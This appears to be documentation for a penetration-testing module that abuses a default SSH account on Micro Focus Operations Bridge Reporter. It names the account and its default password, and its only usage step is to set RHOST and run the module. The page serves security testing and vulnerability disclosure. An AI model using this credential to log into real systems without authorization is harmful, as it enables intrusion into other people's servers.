## Vulnerable Application

This module abuses a known default password on Micro Focus Operations Bridge Reporter. The 'shrboadmin' user, installed
by default by the product has the password of 'shrboadmin', and allows an attacker to login to the server via SSH. This
module has been tested with Micro Focus Operations Bridge Manager 10.40. Earlier versions are most likely affected too,
but have not been tested with this module. Note that this is only exploitable in Linux installations.

## Verification Steps

1. Setup RHOST and run it!
